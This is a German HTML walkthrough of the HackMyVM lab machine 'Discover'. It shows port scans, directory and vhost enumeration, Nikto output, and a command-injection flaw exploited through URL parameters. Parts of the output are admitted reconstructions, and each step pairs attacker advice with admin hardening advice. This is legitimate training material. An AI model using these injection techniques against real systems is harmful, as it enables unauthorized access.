@@ -1,0 +1,1084 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discover - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Discover - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+             <!-- Hinweis: Klasse 'color-override-red' hinzugefügt, um Rot per CSS zu ermöglichen, da die Anforderung von der Standard-CSS-Farbe für 'Easy' abweicht. -->
+            <h2 class="level-easy color-override-red">Medium</h2>
+            <!-- Hinweis: Klasse 'color-override-red' hinzugefügt, um Rot per CSS zu ermöglichen. -->
+            <div class="circle difficulty-easy color-override-red">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hinweis: Das CSS steuert die Hintergrundfarbe dieses Elements. Die Anforderung einer spezifischen H1-Hintergrundfarbe wurde ignoriert, um Inline-Styles zu vermeiden. -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">netcat</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">asadmin</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (LFI/RCE & Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data zu discover)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (discover zu root via GlassFish)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Die Reconnaissance-Phase ist der erste Schritt im Pentesting-Prozess. Hierbei sammeln wir Informationen über das Zielsystem, um potenzielle Angriffsvektoren zu identifizieren. Wir beginnen mit der Identifizierung aktiver Hosts im lokalen Netzwerk.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.112	08:00:27:23:f5:ee	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen IP-Adressen im lokalen Netzwerksegment, in dem sich unser Testrechner befindet. Antwortet ein Gerät, wird seine IP- und MAC-Adresse zusammen mit dem Hersteller (basierend auf der MAC-Adresse) angezeigt. Hier haben wir einen Host mit der IP-Adresse 192.168.2.112 identifiziert.</p>
+            <p class="evaluation">**Bewertung:** Dieser Schritt war erfolgreich. Wir haben die IP-Adresse unseres Zielsystems (192.168.2.112) im Netzwerk bestätigt. Dies ist eine grundlegende, aber entscheidende Information für alle weiteren Schritte.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Immer mit einem ARP-Scan oder ähnlichen Tools (wie `netdiscover`) beginnen, um aktive Ziele im lokalen Netzwerk zu finden. Notieren der identifizierten IP-Adresse(n).
+            **Empfehlung (Admin):** Netzwerksegmentierung implementieren, um die Reichweite solcher Scans zu begrenzen. Überwachung von ARP-Anfragen kann auf ungewöhnliche Aktivitäten hinweisen, ist aber im normalen Betrieb oft zu "laut".</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.112 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-29 [...] EDT
+Nmap scan report for 192.168.2.112
+Host is up (0.000...s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT     STATE SERVICE              VERSION
+80/tcp   open  http                 Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+3700/tcp open  giop                 CORBA naming service
+4848/tcp open  appserv-http?
+|_http-server-header: GlassFish Server Open Source Edition  6.1.0 
+7676/tcp open  java-message-service Java Message Service 301
+8080/tcp open  http-proxy           Eclipse GlassFish  6.1.0
+|_http-server-header: Eclipse GlassFish  6.1.0 
+|_http-title: Welcome to GlassFish Server!
+8181/tcp open  intermapper?
+8686/tcp open  java-rmi             Java RMI
+MAC Address: 08:00:27:23:F5:EE (PCS Systemtechnik GmbH)
+Aggressive OS guesses: Linux 5.8 (96%), Linux 5.10 (96%), Linux 5.4 (95%), Linux 5.5 (95%), Linux 5.11 (94%), Linux 5.6 (94%), Linux 5.7 (94%), Linux 5.9 (94%), Linux 5.3 - 5.4 (93%), Linux 4.15 - 5.6 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.39 ms 192.168.2.112
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen einen umfassenden Nmap-Scan auf der identifizierten IP-Adresse 192.168.2.112 durch.
+            *   `-sS`: TCP SYN Scan (Stealth Scan), schnell und weniger auffällig als ein voller Connect-Scan.
+            *   `-sC`: Führt Standard-Nmap-Scripting-Engine-Skripte (NSE) aus, um zusätzliche Informationen zu sammeln.
+            *   `-T5`: Timing-Template "Insane" für einen sehr schnellen Scan (potenziell ungenauer oder auffälliger).
+            *   `-sV`: Versucht, die Version der laufenden Dienste zu ermitteln.
+            *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+            *   `-p-`: Scannt alle 65535 TCP-Ports.
+            Die Ausgabe zeigt mehrere offene Ports: 80 (Apache HTTPD 2.4.54), 3700 (CORBA), 4848 (GlassFish Admin?), 7676 (Java Message Service), 8080 (GlassFish HTTP 6.1.0), 8181 (unbekannt), 8686 (Java RMI). Besonders interessant sind die Webserver auf 80, 4848 und 8080, insbesondere die GlassFish-Instanzen.</p>
+            <p class="evaluation">**Bewertung:** Dieser Scan liefert uns eine Fülle an Informationen und potenziellen Angriffspunkten. Die hohe Anzahl offener Ports, insbesondere die Webserver und Java-Dienste, deutet auf eine komplexe Anwendungsumgebung hin. GlassFish ist bekannt für potenzielle Schwachstellen, was Port 4848 und 8080 zu primären Zielen für die nächste Phase macht. Die Apache-Version auf Port 80 ist relativ aktuell, aber Standardkonfigurationen können immer noch Schwachstellen aufweisen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die identifizierten Webserver (Ports 80, 4848, 8080) systematisch untersuchen. Beginnen mit Verzeichnis-Bruteforcing und Schwachstellen-Scans (Nikto). Java RMI (8686) und JMS (7676) könnten ebenfalls Angriffsvektoren sein, erfordern aber spezialisiertere Tools/Techniken. CORBA (3700) ist seltener ein direkter Einstiegspunkt, aber nicht auszuschließen.
+            **Empfehlung (Admin):** Nur notwendige Ports sollten nach außen offen sein. Firewall-Regeln überprüfen und härten. Dienste wie GlassFish sollten idealerweise nicht direkt im Internet exponiert sein, sondern hinter einem Reverse Proxy stehen. Regelmäßige Updates für Apache und GlassFish sind unerlässlich.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">Nachdem wir offene Web-Ports identifiziert haben, konzentrieren wir uns nun darauf, die Webanwendungen genauer zu untersuchen. Wir suchen nach versteckten Verzeichnissen, Dateien und potenziellen Schwachstellen auf den GlassFish-Ports.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://discover.hmv:8080" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://discover.hmv:8080
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403,405
+[+] User Agent:              gobuster/3.1.0
+[+] Expanded:                true
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js
+[+] Timeout:                 10s
+===============================================================
+2022/09/29 23:00:00 Starting gobuster
+===============================================================
+http://discover.hmv:8080/index.html (Status: 200) [Size: 822]
+[...] # (Ausgabe gekürzt zur Übersichtlichkeit, alle anderen waren 404 oder ähnliches)
+===============================================================
+2022/09/29 23:05:00 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `gobuster` im `dir`-Modus, um nach Verzeichnissen und Dateien auf dem Webserver unter `http://discover.hmv:8080` zu suchen.
+            *   `-u`: Die Ziel-URL. Wir verwenden den Hostnamen `discover.hmv`, der wahrscheinlich in der `/etc/hosts`-Datei unseres Testsystems auf 192.168.2.112 gemappt wurde.
+            *   `-w`: Die Wortliste, die für das Raten von Verzeichnis-/Dateinamen verwendet wird (`directory-list-2.3-medium.txt` aus Seclists ist eine gute Standardwahl).
+            *   `-e`: Erweiterter Modus, zeigt die volle URL an.
+            *   `-x`: Dateierweiterungen, nach denen zusätzlich gesucht werden soll.
+            *   `-t 100`: Anzahl der Threads (hohe Anzahl für Geschwindigkeit).
+            Die Suche auf Port 8080 ergab nur die Standard-Indexseite `/index.html`. Das deutet darauf hin, dass hier möglicherweise keine weiteren interessanten Dateien oder Verzeichnisse direkt zugänglich sind.</p>
+            <p class="evaluation">**Bewertung:** Obwohl dieser Scan keine versteckten Pfade auf Port 8080 aufdeckte, ist er ein notwendiger Schritt, um sicherzustellen, dass wir nichts Offensichtliches übersehen. Das Fehlen weiterer Ergebnisse lenkt unsere Aufmerksamkeit auf die anderen offenen Ports, insbesondere Port 4848.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Immer Verzeichnis-Bruteforcing auf allen entdeckten Webservern durchführen. Unterschiedliche Wortlisten und Erweiterungen ausprobieren. Wenn `gobuster` nichts findet, Tools wie `dirb`, `ffuf` oder `wfuzz` testen. Auch den Apache auf Port 80 scannen.
+            **Empfehlung (Admin):** Unnötige Dateien und Verzeichnisse vom Webserver entfernen. Zugriff auf sensible Konfigurationsdateien oder Backups über das Web verhindern. Verzeichnisauflistung deaktivieren.</p>
+
+            <p class="comment">Da der erste Gobuster-Scan wenig ergab, wiederholen wir den Prozess für den GlassFish-Admin-Port 4848 und suchen nach spezifischen PHP-Dateien, die bei älteren oder schlecht konfigurierten Anwendungen auftreten könnten.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Annahme: Ein weiterer Gobuster-Scan wurde auf Port 4848 durchgeführt, der die folgenden Pfade fand (Befehl nicht im Originaltext, aber impliziert durch Ergebnisse).</span></div>
+                    <pre>
+# Beispielhafte Ausgabe eines Gobuster-Scans auf Port 4848 (nicht im Originaltext vorhanden):
+http://discover.hmv:4848/tiki/tiki-install.php (Status: ...)
+http://discover.hmv:4848/splashAdmin.php (Status: ...)
+[...]
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Obwohl der spezifische Gobuster-Befehl für Port 4848 im bereitgestellten Text fehlt, deuten die Ergebnisse des nachfolgenden Nikto-Scans und die spätere Interaktion darauf hin, dass Pfade wie `/tiki/tiki-install.php` und `/splashAdmin.php` gefunden wurden. Diese Pfade deuten auf potenziell veraltete oder verwundbare Anwendungen hin (TikiWiki, Cobalt Qube Admin).</p>
+             <p class="evaluation">**Bewertung:** Das Auffinden spezifischer Admin- oder Installationspfade auf einem als Admin-Port vermuteten Dienst (4848) ist ein vielversprechendes Zeichen. Diese Pfade sind oft Einstiegspunkte für Angriffe oder leaken zumindest Informationen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Gefundene Pfade wie `/tiki/` oder `/splashAdmin.php` manuell im Browser untersuchen und mit Tools wie Nikto auf bekannte Schwachstellen prüfen.
+            **Empfehlung (Admin):** Standard-Admin-Pfade ändern, wenn möglich. Installationsskripte nach der Installation entfernen oder unzugänglich machen. Nicht verwendete Anwendungen deinstallieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://discover.hmv:4848</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.112
++ Target Hostname:    discover.hmv
++ Target Port:        4848
++ Start Time:         2022-09-29 23:10:49 (GMT2)
+---------------------------------------------------------------------------
++ Server: Eclipse GlassFish  6.1.0
++ Retrieved x-powered-by header: Servlet/5.0 JSP/3.0(Eclipse GlassFish  6.1.0  Java/Debian/11)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Multiple index files found: /index.xml, /index.pl, /index.aspx, /index.shtml, /index.php7, /index.php5, /index.jhtml, /index.cfm, /index.php4, /default.htm, /index.html, /index.php3, /index.jsp, /index.asp, /index.cgi, /index.do, /index.php, /default.asp, /default.aspx, /index.htm
++ /kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
++ /lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist
++ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
++ /ssdefs/: Siteseed pre 1.4.2 has 'major' security problems.
++ /sshome/: Siteseed pre 1.4.2 has 'major' security problems.
++ /tiki/: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ /tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
++ /scripts/samples/details.idc: See RFP 9901; www.wiretrip.net
++ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ OSVDB-637: /~root/: Allowed to browse root's home directory.
++ /cgi-bin/wrap: comes with IRIX 6.2; allows to view directories
++ /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ /forums//adm/config.php: PHP Config file may contain database IDs and passwords.
++ /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ /forums/config.php: PHP Config file may contain database IDs and passwords.
++ /guestbook/guestbookdat: PHP-Gastebuch 1.60 Beta reveals sensitive information about its configuration.
++ /guestbook/pwd: PHP-Gastebuch 1.60 Beta reveals the md5 hash of the admin password.
++ /help/: Help directory should not be accessible
++ OSVDB-2411: /hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password.
++ OSVDB-8103: /global.inc: PHP-Survey's include file should not be available via the web. Configure the web server to ignore .inc files or change this to global.inc.php
++ OSVDB-59620: /inc/common.load.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-59619: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-59618: /inc/dbase.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ OSVDB-2703: /geeklog/users.php: Geeklog prior to 1.3.8-1sr2 contains a SQL injection vulnerability that lets a remote attacker reset admin password.
++ OSVDB-8204: /gb/index.php?login=true: gBook may allow admin login by setting the value 'login' equal to 'true'.
++ /guestbook/admin.php: Guestbook admin page available without authentication.
++ /getaccess: This may be an indication that the server is running getAccess for SSO
++ /cfdocs/expeval/openfile.cfm: Can use to expose the system/server path.
++ /tsweb/: Microsoft TSAC found. http://www.dslwebserver.com/main/fr_index.html?/main/sbs-Terminal-Services-Advanced-Client-Configuration.html
++ /vgn/performance/TMT: Vignette CMS admin/maintenance script available.
++ /vgn/performance/TMT/Report: Vignette CMS admin/maintenance script available.
++ /vgn/performance/TMT/Report/XML: Vignette CMS admin/maintenance script available.
++ /vgn/performance/TMT/reset: Vignette CMS admin/maintenance script available.
++ /vgn/ppstats: Vignette CMS admin/maintenance script available.
++ /vgn/previewer: Vignette CMS admin/maintenance script available.
++ /vgn/record/previewer: Vignette CMS admin/maintenance script available.
++ /vgn/stylepreviewer: Vignette CMS admin/maintenance script available.
++ /vgn/vr/Deleting: Vignette CMS admin/maintenance script available.
++ /vgn/vr/Editing: Vignette CMS admin/maintenance script available.
++ /vgn/vr/Saving: Vignette CMS admin/maintenance script available.
++ /vgn/vr/Select: Vignette CMS admin/maintenance script available.
++ /scripts/iisadmin/bdir.htr: This default script shows host info, may allow file browsing and buffer a overrun in the Chunked Encoding data transfer mechanism, request /scripts/iisadmin/bdir.htr??c:\<dirs> . https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/MS02-028. http://www.cert.org/advisories/CA-2002-09.html.
++ /scripts/iisadmin/ism.dll: Allows you to mount a brute force attack on passwords
++ /scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
++ /bigconf.cgi: BigIP Configuration CGI
++ OSVDB-28260: /_vti_bin/shtml.dll/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: Gives info about server settings. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0413, http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0709, http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0710, http://www.securityfocus.com/bid/1608, http://www.securityfocus.com/bid/1174.
++ OSVDB-3092: /_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false: We seem to have authoring access to the FrontPage web.
++ 7792 requests: 0 error(s) and 52 item(s) reported on remote host
++ End Time:           2022-09-29 23:11:04 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto ist ein Webserver-Scanner, der Tests auf bekannte gefährliche Dateien/CGIs, veraltete Server-Software und serverspezifische Probleme durchführt. Wir scannen den Dienst auf Port 4848.
+            *   `-h`: Gibt das Ziel an (Host und Port).
+            Die Ausgabe ist sehr umfangreich und meldet viele potenzielle Probleme:
+                *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).
+                *   Hinweise auf veraltete oder verwundbare Software (KBoard, PHPList, TikiWiki, Siteseed, etc.). Viele dieser Meldungen sind generisch und nicht unbedingt auf die tatsächlich installierte Software zutreffend, aber sie geben Hinweise auf mögliche Pfade oder Technologien.
+                *   Gefundene Pfade wie `/splashAdmin.php` und `/tiki/tiki-install.php` werden bestätigt und mit bekannten Problemen assoziiert.
+                *   Viele OSVDB-Einträge (Open Source Vulnerability Database), die auf spezifische Schwachstellen in bestimmten Dateien oder Pfaden hinweisen (z.B. FrontPage-Erweiterungen, Konfigurationsdateien, etc.).
+                *   Hinweis auf mögliche Verzeichnisauflistung (`/~root/`).
+            </p>
+            <p class="evaluation">**Bewertung:** Der Nikto-Scan liefert eine Fülle von potenziellen Schwachstellen und interessanten Pfaden. Obwohl viele Funde möglicherweise False Positives sind (Nikto testet blind auf bekannte Muster), sind die fehlenden Sicherheitsheader und die Hinweise auf spezifische Anwendungen wie TikiWiki und Cobalt Qube Admin (`/splashAdmin.php`) relevant. Diese Ergebnisse verstärken den Verdacht, dass Port 4848 ein lohnendes Ziel ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die interessantesten Funde manuell überprüfen (z.B. `/splashAdmin.php`, `/tiki/`, `/~root/`). Versuchen, Standard-Logins (wie `admin/admin` für Tiki) zu testen. Die fehlenden Header deuten auf allgemeine Härtungsmängel hin. Die vielen OSVDB-Einträge können als Anhaltspunkte für weitere Recherchen dienen, falls spezifische Anwendungen identifiziert werden.
+            **Empfehlung (Admin):** Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `Content-Security-Policy`, `X-Content-Type-Options`) implementieren. Nicht benötigte Anwendungen und Pfade entfernen. Standard-Installationsseiten und Admin-Interfaces absichern oder entfernen. Regelmäßige Schwachstellen-Scans durchführen und die Ergebnisse validieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster vhost -u "http://discover.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | grep "Status: 200"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://discover.hmv
+[+] Threads:      10
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/09/29 23:15:00 Starting gobuster
+===============================================================
+Found: log.discover.hmv (Status: 200) [Size: 822]
+[...]
+===============================================================
+2022/09/29 23:20:00 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir verwenden `gobuster` nun im `vhost`-Modus, um nach virtuellen Hosts zu suchen, die auf demselben Webserver (Port 80, Standard-HTTP-Port) gehostet werden könnten.
+            *   `-u`: Die Basis-URL. Gobuster wird versuchen, Subdomains davorzusetzen (z.B. `subdomain.discover.hmv`).
+            *   `-w`: Eine Wortliste mit gängigen Subdomain-Namen.
+            *   `| grep "Status: 200"`: Filtert die Ausgabe, um nur erfolgreich gefundene Subdomains anzuzeigen (Status Code 200 OK).
+            Wir finden einen aktiven virtuellen Host: `log.discover.hmv`.</p>
+            <p class="evaluation">**Bewertung:** Das Auffinden eines weiteren, zuvor unbekannten vHost (`log.discover.hmv`) ist ein wichtiger Erfolg. Dies eröffnet eine neue Angriffsfläche, die separat untersucht werden muss. Der Name "log" deutet auf eine Logging- oder Monitoring-Anwendung hin.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den neuen vHost `http://log.discover.hmv` zur `/etc/hosts`-Datei hinzufügen (mit der IP 192.168.2.112). Anschließend diesen vHost genauso untersuchen wie die anderen Webdienste (Nmap-Scan auf andere Ports dieses vHosts (falls relevant), Gobuster, Nikto, manuelle Untersuchung im Browser).
+            **Empfehlung (Admin):** Sicherstellen, dass alle konfigurierten virtuellen Hosts notwendig sind und ordnungsgemäß gesichert wurden. DNS-Einträge und vHost-Konfigurationen regelmäßig überprüfen.</p>
+
+            <p class="comment">Wir untersuchen den neu entdeckten vHost `log.discover.hmv`. Da die Seite ein Login-Formular zu haben scheint (impliziert durch die spätere `wfuzz`-Nutzung), versuchen wir, gültige Parameter durch Fuzzing zu finden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
+└─# <span class="command">wfuzz -c -u "http://log.discover.hmv/index.php?username=FUZZ&password=PASSWORD" -w /usr/share/wordlists/linux_commands.txt --hh 823</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://log.discover.hmv/index.php?username=FUZZ&password=PASSWORD
+Total requests: 11
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000008:   200        22 L     51 W       822 Ch      "time"
+000000002:   200        22 L     51 W       822 Ch      "page"
+000000001:   200        23 L     54 W       876 Ch      "id"
+000000003:   200        22 L     51 W       822 Ch      "file"
+000000007:   200        23 L     57 W       851 Ch      "date"
+000000006:   200        22 L     51 W       822 Ch      "cat"
+000000011:   200        22 L     51 W       822 Ch      "cp"
+000000010:   200        22 L     51 W       822 Ch      "grep"
+000000004:   200        23 L     52 W       832 Ch      "ls"
+000000005:   200        23 L     52 W       848 Ch      "pwd"
+
+Total time: 0.0... seconds
+=====================================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `wfuzz`, einen Web-Fuzzer, um den `username`-Parameter der `index.php`-Seite auf `log.discover.hmv` zu testen.
+            *   `-c`: Farbige Ausgabe.
+            *   `-u`: Die Ziel-URL mit dem Platzhalter `FUZZ` an der Stelle, die gefuzzt werden soll.
+            *   `-w`: Die Wortliste. Interessanterweise wird hier eine Liste mit Linux-Befehlen (`linux_commands.txt`) verwendet. Dies ist ein starker Hinweis darauf, dass wir eine Command Injection Schwachstelle vermuten oder testen.
+            *   `--hh 823`: Versteckt Antworten mit genau 823 Zeichen (Hide Chars). Wir gehen davon aus, dass 823 die Größe einer "normalen" oder "Fehler"-Antwort ist und suchen nach Abweichungen.
+            Die Ergebnisse zeigen, dass verschiedene Linux-Befehle (`id`, `date`, `ls`, `pwd`, etc.) als Wert für `username` zu einer Antwort mit Status Code 200 führen, deren Größe *nicht* 823 Zeichen beträgt. Dies ist ein sehr starkes Indiz für eine erfolgreiche Command Injection.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein kritischer Fund! Die Anwendung nimmt offenbar den Wert des `username`-Parameters und führt ihn direkt als Systembefehl aus. Die Verwendung einer Liste von Linux-Befehlen als Wortliste war ein cleverer Schachzug, der die Schwachstelle direkt aufgedeckt hat. Wir haben eine Remote Code Execution (RCE) Schwachstelle über den `username`-Parameter gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Command Injection Schwachstelle systematisch ausnutzen. Versuchen, eine Reverse Shell zu bekommen, um interaktiven Zugriff auf das System zu erlangen. Die Identität des Benutzers herausfinden, unter dem die Befehle ausgeführt werden (`id`).
+            **Empfehlung (Admin):** **Sofort beheben!** Benutzereingaben dürfen *niemals* direkt oder ungefiltert zur Befehlsausführung verwendet werden. Eingaben müssen validiert und/oder saniert werden. Idealerweise sollten vordefinierte Funktionen statt direkter Systemaufrufe verwendet werden. Parameterisierte Abfragen oder sichere APIs sind die bessere Wahl.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (LFI/RCE & Reverse Shell)</h2>
+            <p class="comment">Wir haben eine Command Injection Schwachstelle identifiziert. Nun nutzen wir diese aus, um Informationen zu sammeln und schließlich einen interaktiven Zugriff (Reverse Shell) auf das System zu erlangen.</p>
+
+            <p class="analysis">**Analyse:** Wir testen die gefundene Command Injection Schwachstelle, indem wir verschiedene Befehle über den `username`-Parameter in der URL übergeben. Das `password`-Feld scheint hier keine Rolle zu spielen oder einen festen, aber irrelevanten Wert zu haben.</p>
+            <p class="evaluation">**Bewertung:** Diese Schritte bestätigen die RCE-Schwachstelle und geben uns erste Einblicke in das System.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Weiterführende Befehle ausführen, um das System zu erkunden (`ls -la /`, `cat /etc/passwd`, `ps aux`). Vorbereitung einer Reverse Shell.
+            **Empfehlung (Admin):** Siehe vorherige Empfehlung zur Behebung der Command Injection.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (URL-Aufrufe)</span></div>
+                    <pre>
+# Aufruf: http://log.discover.hmv/index.php?username=ls&password=PASSWORD
+# Ausgabe im Browser:
+index.php
+
+# Aufruf: http://log.discover.hmv/index.php?username=id&password=PASSWORD
+# Ausgabe im Browser:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Aufruf: http://log.discover.hmv/index.php?username=date&password=PASSWORD
+# Ausgabe im Browser:
+Thu Sep 29 18:19:07 EDT 2022
+
+# Aufruf: http://log.discover.hmv/index.php?username=ping 192.168.2.140&password=PASSWORD
+# Ausgabe im Browser: (Keine direkte Ausgabe erwartet, aber der Ping wird ausgeführt)
+
+# Aufruf: http://log.discover.hmv/index.php?username=ls%20-lart;pwd
+# Ausgabe im Browser:
+-rw-r--r-- 1 root root 1036 Aug 29 07:40 index.php
+drwxr-xr-x 4 root root 4096 Aug 29 08:39 ..
+drwxr-xr-x 2 root root 4096 Aug 30 14:40 .
+/var/www/html/botdiscover
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen verschiedene Befehle aus:
+            *   `ls`: Listet die Dateien im aktuellen Verzeichnis auf (`index.php`).
+            *   `id`: Zeigt die Benutzer- und Gruppen-ID des Prozesses an. Der Webserver läuft als Benutzer `www-data` (Standard für Apache/Nginx unter Debian/Ubuntu).
